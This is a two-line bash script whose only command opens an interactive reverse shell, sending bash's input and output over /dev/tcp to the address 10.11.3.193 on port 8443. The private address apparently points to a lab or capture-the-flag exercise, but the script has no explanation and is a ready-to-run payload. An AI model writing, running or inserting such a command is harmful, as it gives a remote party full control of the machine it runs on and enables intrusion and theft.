#!/bin/bash
/bin/bash -c 'exec bash -i &>/dev/tcp/10.11.3.193/8443 <&1'
